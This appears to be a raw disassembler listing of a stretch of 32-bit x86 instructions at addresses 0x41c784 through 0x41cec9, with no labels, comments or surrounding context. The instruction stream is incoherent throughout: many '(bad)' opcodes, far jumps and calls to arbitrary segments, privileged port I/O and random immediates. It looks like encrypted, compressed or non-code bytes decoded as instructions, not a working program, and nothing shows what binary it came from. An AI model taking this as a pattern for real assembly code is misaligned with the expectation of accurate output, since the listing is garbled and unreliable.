  41c784:	mov    ds:0x33860e60,al
  41c789:	or     edx,DWORD PTR [esi+0x7c]
  41c78c:	neg    DWORD PTR [esi-0x5f293034]
  41c792:	pop    eax
  41c793:	and    al,0x14
  41c795:	fmul   st(1),st
  41c797:	das    
  41c798:	xor    eax,0x52b74757
  41c79d:	jbe    0x41c748
  41c79f:	inc    edx
  41c7a0:	js     0x41c819
  41c7a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7a3:	mov    eax,0x58fcbf37
  41c7a8:	and    dh,dh
  41c7aa:	inc    DWORD PTR ds:0xe388cd8
  41c7b0:	lahf   
  41c7b1:	cmp    ebp,DWORD PTR [edx+edi*8+0xf]
  41c7b5:	aaa    
  41c7b6:	mov    dh,0x45
  41c7b8:	xchg   edi,eax
  41c7b9:	inc    ecx
  41c7ba:	mov    ecx,0x378e6cc
  41c7bf:	push   cs
  41c7c0:	jae    0x41c779
  41c7c2:	jge    0x41c774
  41c7c4:	leave  
  41c7c5:	dec    esi
  41c7c6:	xlat   BYTE PTR ds:[ebx]
  41c7c7:	jg     0x41c7b1
  41c7c9:	inc    edx
  41c7ca:	dec    esi
  41c7cb:	add    ah,bl
  41c7cd:	and    eax,0x56d78423
  41c7d2:	fmul   QWORD PTR [eax]
  41c7d4:	mov    ah,0xd8
  41c7d6:	push   ecx
  41c7d7:	xor    bh,bh
  41c7d9:	mov    edx,0xd7f25e43
  41c7de:	adc    esp,eax
  41c7e0:	int3   
  41c7e1:	ins    DWORD PTR es:[edi],dx
  41c7e2:	jb     0x41c79a
  41c7e4:	outs   dx,BYTE PTR ds:[esi]
  41c7e5:	psubsw mm7,QWORD PTR [ebx]
  41c7e8:	loop   0x41c785
  41c7ea:	jne    0x41c774
  41c7ec:	or     DWORD PTR ds:0xcb60cfd0,edx
  41c7f2:	test   DWORD PTR [ebp+0xc9b90f9],esi
  41c7f8:	push   esi
  41c7f9:	shl    ebx,1
  41c7fb:	inc    edi
  41c7fc:	xchg   esi,eax
  41c7fd:	jmp    0xefcc:0x4bef4f76
  41c804:	inc    esp
  41c805:	xchg   esp,esi
  41c807:	call   0x9d902f74
  41c80c:	inc    ebx
  41c80d:	add    DWORD PTR ds:0x2626cbdf,edx
  41c813:	dec    ebx
  41c814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c815:	add    BYTE PTR [ebx+0x6],ah
  41c818:	sub    DWORD PTR [ebp+0x113473e0],edx
  41c81e:	dec    ebx
  41c81f:	fsubr  DWORD PTR [edx+0x387949c]
  41c825:	add    esp,edx
  41c827:	js     0x41c86b
  41c829:	push   0xffffff98
  41c82b:	jg     0x41c884
  41c82d:	mov    eax,ds:0x3a01086e
  41c832:	inc    ebx
  41c833:	lock mov ebx,0x61f0e7c3
  41c839:	or     BYTE PTR [ebp-0x4a],bl
  41c83c:	pop    esp
  41c83d:	sub    DWORD PTR [eax-0x68],ebp
  41c840:	and    al,0xa9
  41c842:	dec    eax
  41c843:	mov    ds:0x325e7d25,eax
  41c848:	pop    eax
  41c849:	or     BYTE PTR [eax-0x1e],bh
  41c84c:	imul   eax,DWORD PTR [eax-0x6f51c56d],0xac725a86
  41c856:	jae    0x41c805
  41c858:	mov    ch,0x4c
  41c85a:	retf   0x8d6e
  41c85d:	xchg   dh,ah
  41c85f:	add    dh,cl
  41c861:	scas   al,BYTE PTR es:[edi]
  41c862:	xor    BYTE PTR [ecx+0x2a406ca8],bh
  41c868:	lahf   
  41c869:	fbld   TBYTE PTR [esi]
  41c86b:	out    dx,eax
  41c86c:	jmp    0x41c7ee
  41c86e:	lea    ecx,[esi+edi*8]
  41c871:	jp     0x41c7f4
  41c873:	pusha  
  41c874:	jae    0x41c876
  41c876:	loopne 0x41c886
  41c878:	dec    ebp
  41c879:	aas    
  41c87a:	mov    ebp,DWORD PTR [eax+0x4]
  41c87d:	mov    esp,0x7af8c31b
  41c882:	dec    ebp
  41c883:	jno    0x41c8bd
  41c885:	xchg   edi,eax
  41c886:	dec    DWORD PTR [esi+0x651608dc]
  41c88c:	jl     0x41c83c
  41c88e:	adc    ebx,0x46
  41c891:	sub    eax,0x10f4f2b6
  41c896:	int3   
  41c897:	pop    es
  41c898:	ds (bad) 
  41c89a:	retf   0xe951
  41c89d:	retf   
  41c89e:	cmp    eax,edx
  41c8a0:	bnd jl 0x41c874
  41c8a3:	jmp    FWORD PTR [esi]
  41c8a5:	(bad)  
  41c8a6:	pop    ds
  41c8a7:	test   DWORD PTR [ebx-0x63],ebp
  41c8aa:	sahf   
  41c8ab:	shr    DWORD PTR [ecx-0x1b],0x52
  41c8af:	pop    esp
  41c8b0:	(bad)  
  41c8b1:	pop    esp
  41c8b2:	ds popf 
  41c8b4:	mov    bl,BYTE PTR [ecx-0x27]
  41c8b7:	push   0xe664487f
  41c8bc:	dec    ebp
  41c8bd:	and    al,0x71
  41c8bf:	sahf   
  41c8c0:	xchg   ecx,eax
  41c8c1:	mov    al,ds:0xf22ff8ce
  41c8c6:	(bad)  
  41c8c7:	sub    DWORD PTR [edx+0x6b6f9451],edx
  41c8cd:	xchg   ebp,eax
  41c8ce:	in     eax,0x22
  41c8d0:	dec    ebp
  41c8d1:	ret    
  41c8d2:	adc    al,0x81
  41c8d4:	jmp    0x2d3771f2
  41c8d9:	and    esi,DWORD PTR [edi]
  41c8db:	mov    eax,ds:0x73258978
  41c8e0:	test   BYTE PTR [ebx],0xe5
  41c8e3:	js     0x41c919
  41c8e5:	mov    WORD PTR [edx+0x5afdc328],cs
  41c8eb:	(bad)  
  41c8ed:	cmp    ebx,esp
  41c8ef:	out    dx,al
  41c8f0:	stc    
  41c8f1:	sahf   
  41c8f2:	(bad)  
  41c8f3:	in     al,0xf8
  41c8f5:	lock dec edx
  41c8f7:	pop    eax
  41c8f8:	inc    ebp
  41c8f9:	adc    DWORD PTR [ebp+0x2c1b420c],eax
  41c8ff:	sub    al,0xc8
  41c901:	scas   eax,DWORD PTR es:[edi]
  41c902:	hlt    
  41c903:	sbb    al,0x96
  41c905:	jmp    0xf61ace43
  41c90a:	add    al,0x62
  41c90c:	ss xchg edi,eax
  41c90e:	fwait
  41c90f:	daa    
  41c910:	dec    ebp
  41c911:	imul   ebx,DWORD PTR [edx],0x38fecf3b
  41c917:	mov    BYTE PTR [edi+edx*1+0x4f],0x55
  41c91c:	retf   
  41c91d:	pop    eax
  41c91e:	rcl    dl,0x96
  41c921:	xchg   edi,eax
  41c922:	js     0x41c8e7
  41c924:	loop   0x41c985
  41c926:	mov    esi,0x488267a2
  41c92b:	test   BYTE PTR [di],dl
  41c92e:	ret    
  41c92f:	jbe    0x41c8ed
  41c931:	push   ebx
  41c932:	or     esi,ebp
  41c934:	pop    ecx
  41c935:	scas   eax,DWORD PTR es:[edi]
  41c936:	fidivr WORD PTR [eax+0x4e]
  41c939:	adc    ah,dl
  41c93b:	mov    gs:0x83649610,al
  41c941:	outs   dx,DWORD PTR ds:[esi]
  41c942:	sbb    DWORD PTR [ebp+0x7c],esp
  41c945:	mov    ebp,0x5a612040
  41c94a:	dec    edx
  41c94b:	pop    ds
  41c94c:	inc    esi
  41c94d:	or     al,0xea
  41c94f:	mov    esp,0x3ebd2c19
  41c954:	loop   0x41c91d
  41c956:	xor    al,0x42
  41c958:	rcl    BYTE PTR [ebp+0x565aae64],cl
  41c95e:	xlat   BYTE PTR ds:[ebx]
  41c95f:	shl    BYTE PTR [edi-0x4490375e],cl
  41c965:	sub    DWORD PTR [ecx-0x26],ebp
  41c968:	mov    ebp,DWORD PTR [edi]
  41c96a:	sbb    dh,BYTE PTR [esi]
  41c96c:	ror    edx,cl
  41c96e:	sahf   
  41c96f:	imul   eax,DWORD PTR [eax-0x73],0x4d
  41c973:	and    DWORD PTR [eax+0x48],0x49
  41c977:	jb     0x41c998
  41c979:	mov    ebp,0xf7c788ee
  41c97e:	(bad)  
  41c97f:	std    
  41c980:	jmp    0x1dcb:0xb75d60c4
  41c987:	dec    ebp
  41c988:	mov    esi,0x3a98d5e0
  41c98d:	dec    ebp
  41c98e:	push   ss
  41c98f:	les    esp,FWORD PTR [ebx]
  41c991:	mov    al,0xad
  41c993:	test   eax,0xcf981012
  41c998:	mov    ch,0x9c
  41c99a:	(bad)  [ecx+0x2e0b1d3c]
  41c9a0:	dec    edi
  41c9a1:	pop    edi
  41c9a2:	pop    ds
  41c9a3:	jmp    0x41c9bb
  41c9a5:	mov    edi,DWORD PTR [eax+edx*1]
  41c9a8:	call   0x37e8c305
  41c9ad:	pop    eax
  41c9ae:	pop    edi
  41c9af:	dec    edx
  41c9b0:	stos   BYTE PTR es:[edi],al
  41c9b1:	xchg   ecx,eax
  41c9b2:	ins    DWORD PTR es:[edi],dx
  41c9b3:	(bad)  [edi-0x119cc65c]
  41c9b9:	ins    BYTE PTR es:[edi],dx
  41c9ba:	aam    0xc
  41c9bc:	dec    ebx
  41c9bd:	popa   
  41c9be:	scas   eax,DWORD PTR es:[edi]
  41c9bf:	inc    ebx
  41c9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9c1:	sub    ebp,DWORD PTR [ebp-0x54]
  41c9c4:	int    0x44
  41c9c6:	in     al,0x29
  41c9c8:	mov    ds:0xae0c266e,al
  41c9cd:	aaa    
  41c9ce:	inc    eax
  41c9cf:	pop    ss
  41c9d0:	dec    ecx
  41c9d1:	cwde   
  41c9d2:	sahf   
  41c9d3:	sbb    bl,BYTE PTR [ecx-0x79a0ec68]
  41c9d9:	jle    0x41ca15
  41c9db:	push   0x6e6ed9e3
  41c9e0:	xchg   eax,esp
  41c9e2:	outs   dx,DWORD PTR ds:[esi]
  41c9e3:	sub    eax,0x540db60d
  41c9e8:	mov    DWORD PTR [ecx+0x3c5b0b31],esi
  41c9ee:	ret    
  41c9ef:	call   0x380:0x66a28e8d
  41c9f6:	mov    ch,0x70
  41c9f8:	addr16 mov ebp,0xd3b3aa5c
  41c9fe:	call   0x262c78ed
  41ca03:	outs   dx,DWORD PTR ds:[esi]
  41ca04:	mov    edx,0x60f99818
  41ca09:	fdiv   DWORD PTR [eax+ebx*4+0x3a]
  41ca0d:	jl     0x41c9ae
  41ca0f:	mov    bl,0xc1
  41ca11:	add    ebx,ecx
  41ca13:	pop    ss
  41ca14:	mov    esp,0x53d3de8c
  41ca19:	or     ebp,DWORD PTR [esi-0x6f371017]
  41ca1f:	pusha  
  41ca20:	pop    es
  41ca21:	and    dh,dl
  41ca23:	cmp    esp,DWORD PTR [eax]
  41ca25:	jle    0x41c9bf
  41ca27:	dec    ebx
  41ca28:	cmc    
  41ca29:	data16 data16 jno 0x41c9ef
  41ca2d:	xchg   ebp,eax
  41ca2e:	sti    
  41ca2f:	popa   
  41ca30:	pop    eax
  41ca31:	mov    dh,0x6e
  41ca33:	add    dh,ch
  41ca35:	sub    DWORD PTR [ebx],ebx
  41ca37:	xchg   esp,eax
  41ca38:	out    0x46,al
  41ca3a:	sub    BYTE PTR [ecx+0x7],dh
  41ca3d:	mov    dh,BYTE PTR [ebp-0x45]
  41ca40:	xchg   BYTE PTR ds:[ecx+0x5484c460],bh
  41ca47:	xchg   ebx,eax
  41ca48:	or     eax,0x30c20303
  41ca4d:	push   0xffffffb0
  41ca4f:	sub    DWORD PTR [eax+0x25fb0a25],esi
  41ca55:	scas   al,BYTE PTR es:[edi]
  41ca56:	mov    eax,ds:0x5bd33178
  41ca5b:	sub    eax,0x47847cbe
  41ca60:	xchg   esp,eax
  41ca61:	or     eax,DWORD PTR ds:0x59612934
  41ca67:	xchg   esi,eax
  41ca68:	(bad)  
  41ca69:	pop    edx
  41ca6a:	cli    
  41ca6b:	jmp    0x41ca6e
  41ca6d:	xchg   BYTE PTR [ebx],cl
  41ca6f:	ret    
  41ca70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca71:	ja     0x41cabf
  41ca73:	mov    dx,0xdff1
  41ca77:	pop    esp
  41ca78:	push   0xab1f7b9e
  41ca7d:	push   0xffffffcf
  41ca7f:	xor    BYTE PTR [edx],ch
  41ca81:	int    0x89
  41ca83:	clc    
  41ca84:	scas   eax,DWORD PTR es:[edi]
  41ca85:	arpl   di,ax
  41ca87:	in     al,dx
  41ca88:	mov    ah,0x59
  41ca8a:	fsub   QWORD PTR [ebx]
  41ca8c:	sub    al,0x2c
  41ca8e:	stos   DWORD PTR es:[edi],eax
  41ca8f:	pop    edx
  41ca90:	stc    
  41ca91:	jp     0x41ca9d
  41ca93:	les    ebx,FWORD PTR [edi]
  41ca95:	fistp  DWORD PTR [ebp-0x3746e91f]
  41ca9b:	jecxz  0x41ca45
  41ca9d:	mov    esp,0xeee8de01
  41caa2:	xchg   esi,eax
  41caa3:	enter  0xc1d,0x36
  41caa7:	retf   
  41caa8:	add    al,0x83
  41caaa:	mov    dh,0x8c
  41caac:	les    edx,FWORD PTR [ebx]
  41caae:	lods   eax,DWORD PTR ds:[esi]
  41caaf:	cld    
  41cab0:	std    
  41cab1:	dec    ebx
  41cab2:	dec    eax
  41cab3:	dec    ecx
  41cab4:	into   
  41cab5:	xchg   DWORD PTR [esi-0x40859f2e],ebp
  41cabb:	lock ins DWORD PTR es:[edi],dx
  41cabd:	shr    DWORD PTR [eax+0x64],cl
  41cac0:	popf   
  41cac1:	pop    ds
  41cac2:	(bad)  
  41cac3:	jmp    0x4754:0xeaa234f4
  41caca:	stos   BYTE PTR es:[edi],al
  41cacb:	mov    bl,0x68
  41cacd:	and    BYTE PTR [ebp-0x33],0x19
  41cad1:	cld    
  41cad2:	scas   eax,DWORD PTR es:[edi]
  41cad3:	lea    eax,[eax]
  41cad5:	add    BYTE PTR [edi+0x55],cl
  41cad8:	sub    al,0x28
  41cada:	ret    
  41cadb:	(bad)  
  41cade:	call   0x2614:0x638e9c50
  41cae5:	dec    esi
  41cae6:	enter  0x1f2d,0xd0
  41caea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caeb:	dec    ebx
  41caec:	fnstsw WORD PTR [eax+0x71]
  41caef:	jnp    0x41ca9b
  41caf1:	sahf   
  41caf2:	fwait
  41caf3:	xchg   ebp,eax
  41caf4:	inc    edi
  41caf5:	lahf   
  41caf6:	je     0x41cb28
  41caf8:	retf   
  41caf9:	adc    eax,0x1137b52d
  41cafe:	js     0x41caf1
  41cb00:	sub    BYTE PTR [ecx+0x16],ah
  41cb03:	inc    BYTE PTR [ebx+0x2053d3fe]
  41cb09:	ret    0x39e6
  41cb0c:	dec    edi
  41cb0d:	sbb    DWORD PTR [esi-0x34],ecx
  41cb10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb11:	inc    edx
  41cb12:	(bad)  
  41cb13:	(bad)  
  41cb14:	mov    bh,0x5f
  41cb16:	clc    
  41cb17:	dec    ecx
  41cb18:	or     edx,edi
  41cb1a:	jae    0x41cb94
  41cb1c:	div    DWORD PTR [ebx-0x1602fc86]
  41cb22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb23:	aad    0xe1
  41cb25:	ret    
  41cb26:	loop   0x41cb30
  41cb28:	fdivrp st(3),st
  41cb2a:	lds    ecx,FWORD PTR [ecx+ecx*4-0x13]
  41cb2e:	loop   0x41cb3f
  41cb30:	mov    ebp,0x7deee878
  41cb35:	add    edx,DWORD PTR [edx]
  41cb37:	xor    BYTE PTR [esi-0x45213b1e],cl
  41cb3d:	rcl    BYTE PTR [esi+0x37],cl
  41cb40:	int    0x1f
  41cb42:	ret    0xfa47
  41cb45:	push   es
  41cb46:	inc    DWORD PTR [edi-0x41691f86]
  41cb4c:	cwde   
  41cb4d:	fldcw  WORD PTR [eax]
  41cb4f:	dec    ebx
  41cb50:	mov    edi,0xde676a1b
  41cb55:	int3   
  41cb56:	pop    ss
  41cb57:	mov    ?,WORD PTR [ebp-0x30]
  41cb5a:	push   cs
  41cb5b:	push   ebx
  41cb5c:	inc    ebx
  41cb5d:	jg     0x41cbd1
  41cb5f:	push   ss
  41cb60:	jmp    0x1160:0xb15ab408
  41cb67:	(bad)  
  41cb68:	pop    esp
  41cb69:	call   0x32d6:0x2b962cd6
  41cb70:	out    0xb7,eax
  41cb72:	je     0x41cb2f
  41cb74:	push   ds
  41cb75:	dec    eax
  41cb76:	adc    eax,0x33a25f08
  41cb7b:	daa    
  41cb7c:	xchg   esi,eax
  41cb7d:	imul   edx,DWORD PTR [esp+edx*1+0x45],0x67ae7355
  41cb85:	out    0x77,al
  41cb87:	leave  
  41cb88:	arpl   WORD PTR [ecx-0xeaa6bb7],bx
  41cb8e:	cli    
  41cb8f:	retf   0x3bff
  41cb92:	or     BYTE PTR [edx-0x72],0xe9
  41cb96:	pop    edi
  41cb97:	push   eax
  41cb98:	ror    DWORD PTR [eax+0x3e],0xb0
  41cb9c:	adc    BYTE PTR [ebx],cl
  41cb9e:	mov    al,0x5d
  41cba0:	push   0x4a1bcef7
  41cba5:	mov    BYTE PTR [esi+0x3a591d6b],bh
  41cbab:	lods   al,BYTE PTR ds:[esi]
  41cbac:	and    al,0x2f
  41cbae:	popf   
  41cbaf:	outs   dx,DWORD PTR ds:[esi]
  41cbb0:	nop
  41cbb1:	push   edi
  41cbb2:	pop    esi
  41cbb3:	fidivr WORD PTR [eax-0x6]
  41cbb6:	imul   esi,DWORD PTR [ebp-0x7d393c4],0x28
  41cbbd:	ins    BYTE PTR es:[edi],dx
  41cbbe:	add    DWORD PTR [edx-0x33],esi
  41cbc1:	ror    dh,1
  41cbc3:	stos   BYTE PTR es:[edi],al
  41cbc4:	adc    esp,DWORD PTR [ebx]
  41cbc6:	jle    0x41cbf0
  41cbc8:	dec    ecx
  41cbc9:	cwde   
  41cbca:	ins    DWORD PTR es:[edi],dx
  41cbcb:	inc    esi
  41cbcc:	imul   eax,DWORD PTR [ecx],0xf59233bd
  41cbd2:	pusha  
  41cbd3:	push   ebx
  41cbd4:	or     DWORD PTR [ecx+ecx*1-0x1],ebp
  41cbd8:	sbb    ebp,ebx
  41cbda:	cmp    dl,cl
  41cbdc:	(bad)  
  41cbdd:	mov    edx,0xdef1691b
  41cbe2:	loope  0x41cc53
  41cbe4:	out    0xff,eax
  41cbe6:	jmp    0xa1ad:0x35a26703
  41cbed:	inc    ebp
  41cbee:	in     eax,dx
  41cbef:	lods   eax,DWORD PTR ds:[esi]
  41cbf0:	adc    bh,0x94
  41cbf3:	mov    edx,0xb2a6103
  41cbf8:	fstp   TBYTE PTR [edi+edi*4-0x2d4e956]
  41cbff:	push   ss
  41cc00:	cmc    
  41cc01:	mov    ah,0xa9
  41cc03:	jnp    0x41cbda
  41cc05:	pop    ds
  41cc06:	dec    ebx
  41cc07:	pusha  
  41cc08:	enter  0xbb36,0x55
  41cc0c:	dec    ebx
  41cc0d:	leave  
  41cc0e:	inc    ebp
  41cc0f:	inc    ebp
  41cc10:	fisubr WORD PTR [eax-0x79]
  41cc13:	leave  
  41cc14:	xor    BYTE PTR [edx+0x7054ac4c],ch
  41cc1a:	lock xor BYTE PTR [esi],bh
  41cc1d:	outs   dx,DWORD PTR ds:[esi]
  41cc1e:	ins    DWORD PTR es:[edi],dx
  41cc1f:	adc    eax,0xebd97f8a
  41cc24:	test   al,0x2b
  41cc26:	mov    cl,0xfe
  41cc28:	push   esp
  41cc29:	mov    ds:0xb57fa8cc,eax
  41cc2e:	(bad)  
  41cc2f:	xor    eax,0xb07bdd8f
  41cc34:	fwait
  41cc35:	inc    ecx
  41cc36:	imul   ecx,DWORD PTR [esi-0x1cf5586b],0x7e
  41cc3d:	jae    0x41cc46
  41cc3f:	in     al,dx
  41cc40:	sbb    BYTE PTR [edx-0x36e419d4],0xf5
  41cc47:	mov    ch,0x79
  41cc49:	popf   
  41cc4a:	test   al,0xe8
  41cc4c:	cmp    al,0x97
  41cc4e:	or     BYTE PTR cs:[ebx+0x26221bf3],ch
  41cc55:	jb     0x41cc7e
  41cc57:	xor    ecx,DWORD PTR [esp+eax*4-0x14761e34]
  41cc5e:	pushf  
  41cc5f:	iret   
  41cc60:	pop    edi
  41cc61:	je     0x41cc1c
  41cc63:	ret    0xa649
  41cc66:	mov    al,BYTE PTR fs:[edx]
  41cc69:	jae    0x41cc89
  41cc6b:	sub    dh,BYTE PTR [eax-0x77]
  41cc6e:	test   DWORD PTR [eax+0x5e],esi
  41cc71:	sbb    al,0xed
  41cc73:	mov    cl,0xba
  41cc75:	lea    ecx,[edx+ecx*1+0x1b]
  41cc79:	lods   al,BYTE PTR ds:[esi]
  41cc7a:	mov    eax,ds:0x3e1dc717
  41cc7f:	push   esp
  41cc80:	or     al,0xdb
  41cc82:	mov    eax,0xd612b767
  41cc87:	les    ecx,FWORD PTR [edi]
  41cc89:	xor    al,0x39
  41cc8b:	pop    ds
  41cc8c:	or     ebx,ebx
  41cc8e:	or     BYTE PTR [eax+0x40],ch
  41cc91:	push   ebp
  41cc92:	cs ja  0x41cd09
  41cc95:	jbe    0x41ccaa
  41cc97:	out    0x48,al
  41cc99:	lds    ebx,FWORD PTR [ebp-0x68c9a4b7]
  41cc9f:	fst    DWORD PTR [ebx+0x3c]
  41cca2:	jmp    0x41cc4e
  41cca4:	mov    edx,0x6352359a
  41cca9:	jbe    0x41cc58
  41ccab:	mov    ch,0x8c
  41ccad:	cmp    eax,DWORD PTR [esp+ebx*1-0x607a2922]
  41ccb4:	dec    esp
  41ccb5:	je     0x41cc91
  41ccb7:	mov    BYTE PTR es:[ecx],ch
  41ccba:	shl    BYTE PTR [esi],cl
  41ccbc:	ret    
  41ccbd:	mov    edx,edx
  41ccbf:	ror    BYTE PTR [esi],0x8
  41ccc2:	lods   al,BYTE PTR ds:[esi]
  41ccc3:	pop    es
  41ccc4:	push   esp
  41ccc5:	stc    
  41ccc6:	mov    eax,ds:0xbb74fa6e
  41cccb:	or     eax,0x85cf4500
  41ccd0:	xor    al,0x82
  41ccd2:	adc    al,0x14
  41ccd4:	outs   dx,BYTE PTR ds:[esi]
  41ccd5:	clc    
  41ccd6:	jae    0x41cd18
  41ccd8:	jno    0x41cca1
  41ccda:	push   edx
  41ccdb:	dec    edi
  41ccdc:	and    esp,esp
  41ccde:	xlat   BYTE PTR ds:[ebx]
  41ccdf:	xor    al,0xca
  41cce1:	xchg   esp,eax
  41cce2:	fisub  DWORD PTR [ecx-0x39]
  41cce5:	ins    BYTE PTR es:[edi],dx
  41cce6:	popf   
  41cce7:	cmp    esp,ebx
  41cce9:	or     ch,BYTE PTR [ecx]
  41cceb:	fcomp  DWORD PTR [ebx]
  41cced:	mov    eax,ds:0x10365984
  41ccf2:	jl     0x41ccfb
  41ccf4:	add    bl,dl
  41ccf6:	rcl    DWORD PTR [ecx+ebp*1+0x52],cl
  41ccfa:	test   DWORD PTR [eax-0x68e40662],0x9609f4d2
  41cd04:	xchg   ecx,eax
  41cd05:	pop    ebp
  41cd06:	stc    
  41cd07:	adc    BYTE PTR [edi-0x17],0x47
  41cd0b:	jmp    0x41ccb4
  41cd0d:	xor    ecx,esi
  41cd0f:	nop
  41cd10:	xchg   edx,eax
  41cd11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd12:	sub    eax,0xea6bfb92
  41cd17:	mov    bh,0xe5
  41cd19:	ret    
  41cd1a:	scas   eax,DWORD PTR es:[edi]
  41cd1b:	jecxz  0x41ccfb
  41cd1d:	fist   DWORD PTR [edx-0x69]
  41cd20:	fild   QWORD PTR [ecx]
  41cd22:	jns    0x41cd19
  41cd24:	out    0xa6,al
  41cd26:	xor    eax,0xf236c94d
  41cd2b:	retf   
  41cd2c:	or     eax,DWORD PTR [edi]
  41cd2e:	fcom   DWORD PTR [ebp-0x75869914]
  41cd34:	stos   DWORD PTR es:[edi],eax
  41cd35:	inc    ecx
  41cd36:	neg    BYTE PTR ds:0xd612ba44
  41cd3c:	ds loop 0x41cce4
  41cd3f:	jo     0x41cdb2
  41cd41:	push   esi
  41cd42:	es xchg edi,esp
  41cd45:	data16 mov bh,0x50
  41cd48:	call   edx
  41cd4a:	call   0xe588:0x31b3f439
  41cd51:	call   0xb752:0xac996161
  41cd58:	mov    dl,0x82
  41cd5a:	inc    edx
  41cd5b:	mov    ecx,0x58eb1a2b
  41cd60:	addr16 xor bl,0x29
  41cd64:	jmp    0xf1d6:0xf7cfa624
  41cd6b:	cmp    dh,al
  41cd6d:	ja     0x41cde0
  41cd6f:	pop    ecx
  41cd70:	or     eax,0xc1eaf75c
  41cd75:	(bad)  
  41cd76:	push   ds
  41cd77:	cs loopne 0x41cd77
  41cd7a:	sbb    DWORD PTR [edx],edi
  41cd7c:	shl    DWORD PTR [ebp+0x5d],1
  41cd7f:	xchg   edi,eax
  41cd80:	dec    ebp
  41cd81:	cwde   
  41cd82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd83:	jmp    0x41cde8
  41cd85:	push   edx
  41cd86:	pop    ds
  41cd87:	cmp    DWORD PTR [ebx+0x495c92db],0xa3b8f6ad
  41cd91:	out    0xa1,al
  41cd93:	or     bl,ah
  41cd95:	cmp    al,0xc1
  41cd97:	out    dx,eax
  41cd98:	sti    
  41cd99:	enter  0x3fd0,0x1
  41cd9d:	push   0x76
  41cd9f:	in     eax,0x3d
  41cda1:	stos   DWORD PTR es:[edi],eax
  41cda2:	call   0xf5b1:0xe366cbf9
  41cda9:	loop   0x41cdb5
  41cdab:	cmp    al,0xe7
  41cdad:	cmp    dl,dl
  41cdaf:	jb     0x41cd58
  41cdb1:	sbb    eax,0x36d9f1d
  41cdb6:	(bad)  
  41cdb7:	hlt    
  41cdb8:	and    BYTE PTR [ecx],al
  41cdba:	mov    BYTE PTR [eax+0x78],dh
  41cdbd:	and    eax,0x7cbd4a24
  41cdc2:	(bad)  
  41cdc3:	xor    DWORD PTR ds:0x4fb0ecdc,eax
  41cdc9:	xor    DWORD PTR [esi-0x1f],esp
  41cdcc:	add    BYTE PTR [edx*2+0x93cfe44],cl
  41cdd3:	dec    ecx
  41cdd4:	aad    0xda
  41cdd6:	mov    esp,0xf3e6e065
  41cddc:	push   edi
  41cddd:	ror    BYTE PTR [esi],cl
  41cddf:	jecxz  0x41cd7f
  41cde1:	xor    BYTE PTR ds:0x6bd997e4,dh
  41cde7:	pop    ds
  41cde8:	mul    BYTE PTR [edx+0x7ab55e18]
  41cdee:	not    DWORD PTR [ebp+ebp*8-0x260f3aa8]
  41cdf5:	sub    DWORD PTR [ebp+eax*1-0x710af2e9],ebx
  41cdfc:	test   al,0x98
  41cdfe:	inc    eax
  41cdff:	sbb    DWORD PTR [edi+eiz*1+0x232fc1b8],ebx
  41ce06:	imul   bh
  41ce08:	inc    esi
  41ce09:	cmp    BYTE PTR [ebp+0x320711cc],0xa6
  41ce10:	ins    BYTE PTR es:[edi],dx
  41ce11:	jns    0x41cdb6
  41ce13:	sbb    BYTE PTR [ecx+eiz*8-0x36a1f858],ah
  41ce1a:	jmp    0x41ce15
  41ce1c:	bswap  ebx
  41ce1e:	repz jnp 0x41ce19
  41ce21:	outs   dx,BYTE PTR ds:[esi]
  41ce22:	jmp    0x41ce17
  41ce24:	xchg   ebx,eax
  41ce25:	lods   al,BYTE PTR ds:[esi]
  41ce26:	inc    edi
  41ce27:	fs fwait
  41ce29:	sbb    BYTE PTR [esi],ah
  41ce2b:	pop    esi
  41ce2c:	mov    al,ds:0xe7270a0
  41ce31:	test   BYTE PTR [ebx],0xf6
  41ce34:	in     al,0xc1
  41ce36:	cmp    DWORD PTR [ebx+0x61e876f0],0xffffffe7
  41ce3d:	inc    ebp
  41ce3e:	addr16 inc ecx
  41ce40:	adc    cl,BYTE PTR [edi]
  41ce42:	inc    ebx
  41ce43:	mov    esi,0xdbf773fb
  41ce48:	neg    cl
  41ce4a:	or     eax,0x6d1665dd
  41ce4f:	push   ecx
  41ce50:	not    esp
  41ce52:	gs cli 
  41ce54:	icebp  
  41ce55:	jbe    0x41ce38
  41ce57:	and    eax,0xdbb2112a
  41ce5c:	pop    ebp
  41ce5d:	ror    BYTE PTR [ecx+0x2],1
  41ce60:	sar    DWORD PTR [esi+eiz*4+0x88ed322],1
  41ce67:	inc    esi
  41ce68:	inc    ebp
  41ce69:	enter  0x3e9e,0xf7
  41ce6d:	js     0x41ce34
  41ce6f:	pop    esp
  41ce70:	out    0x8,al
  41ce72:	pop    esi
  41ce73:	xchg   ecx,eax
  41ce74:	pop    ebp
  41ce75:	icebp  
  41ce76:	and    DWORD PTR [esi-0x5f],edx
  41ce79:	(bad)  
  41ce7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce7b:	cli    
  41ce7c:	xor    eax,0x9b407107
  41ce81:	test   DWORD PTR [edx],ebp
  41ce83:	jmp    DWORD PTR [edi+0x39d5d746]
  41ce89:	fs adc al,0x4c
  41ce8c:	out    0xa1,al
  41ce8e:	pusha  
  41ce8f:	xor    esp,edi
  41ce91:	test   al,0x42
  41ce93:	pop    eax
  41ce94:	jnp    0x41ce2e
  41ce96:	dec    ecx
  41ce97:	mov    edi,0xde1134c4
  41ce9c:	xchg   esp,eax
  41ce9d:	push   edi
  41ce9f:	inc    edx
  41cea0:	dec    esi
  41cea1:	lods   al,BYTE PTR ds:[esi]
  41cea2:	sbb    al,0xe9
  41cea4:	or     dl,ch
  41cea6:	loop   0x41cee4
  41cea8:	sub    edx,DWORD PTR [ecx]
  41ceaa:	and    BYTE PTR [ecx-0x1012079c],cl
  41ceb0:	fistp  WORD PTR [edx-0x5d]
  41ceb3:	and    esi,ebp
  41ceb5:	fcom   st(1)
  41ceb7:	xor    eax,0x73393506
  41cebc:	inc    edx
  41cebd:	mov    edx,0x3afdfd9c
  41cec2:	mov    al,ds:0xc37133da
  41cec7:	pop    es
  41cec8:	push   edx
  41cec9:	popa   
